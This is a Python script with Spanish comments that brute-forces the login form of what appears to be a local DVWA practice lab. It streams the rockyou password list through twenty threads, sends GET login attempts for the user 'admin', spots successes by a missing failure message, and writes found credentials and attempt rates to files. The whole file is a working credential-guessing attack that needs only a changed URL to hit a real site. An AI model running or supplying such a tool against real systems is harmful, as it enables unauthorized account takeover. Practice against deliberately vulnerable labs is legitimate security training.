#!/usr/bin/env python3
# bruteforce_get_stream.py
# Lee rockyou línea a línea y usa ThreadPoolExecutor sin cargar todo en memoria.

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from queue import Queue
from threading import Thread

URL = "http://127.0.0.1:8080/vulnerabilities/brute/"
USER = "admin"
PW_FILE = "rock_chunk_aa"          # ruta a rockyou descomprimido
# evita hardcodear PHPSESSID para runs repetibles
COOKIES = {"security": "low"}
FAIL_STRING = "Username and/or password incorrect."
THREADS = 20
TIMEOUT = 10


def worker(session, q, results):
    while True:
        item = q.get()
        if item is None:
            q.task_done()
            break
        password = item
        try:
            r = session.get(URL, params={"username": USER, "password": password, "Login": "Login"},
                            timeout=TIMEOUT, allow_redirects=True)
            ok = FAIL_STRING not in r.text
            if ok:
                print(f"[FOUND] {USER}:{password}")
                results.append((USER, password))
            else:
                # opcional: imprimir progreso cada N intentos (control externo recomendado)
                pass
        except Exception as e:
            print(f"[ERROR] {password} -> {e}")
        q.task_done()


def main():
    q = Queue(maxsize=THREADS * 4)
    found = []
    session = requests.Session()
    session.headers.update({"User-Agent": "bruteforce-stream/1.0"})

    # levantar hilos trabajadores
    threads = []
    for _ in range(THREADS):
        t = Thread(target=worker, args=(session, q, found), daemon=True)
        t.start()
        threads.append(t)

    start = time.perf_counter()
    total = 0
    with open(PW_FILE, "r", encoding="latin-1", errors="ignore") as fh:  # rockyou suele tener latin-1
        for line in fh:
            pw = line.rstrip("\n")
            if not pw:
                continue
            q.put(pw)
            total += 1

    # esperar que la cola se vacíe
    q.join()
    # parar trabajadores
    for _ in threads:
        q.put(None)
    for t in threads:
        t.join()
    elapsed = time.perf_counter() - start
    print("Done. attempts=", total, "time=", elapsed,
          "rate=", total/elapsed if elapsed > 0 else "inf")
    # guardar resultados
    with open("results_rockyou.txt", "w") as rf:
        for u, p in found:
            rf.write(f"{u}:{p}\n")
    with open("metrics_rockyou.txt", "w") as mf:
        mf.write(
            f"attempts={total}\ntime={elapsed:.2f}\nrate={total/elapsed if elapsed > 0 else 0:.2f}\nthreads={THREADS}\n")


if __name__ == "__main__":
    main()
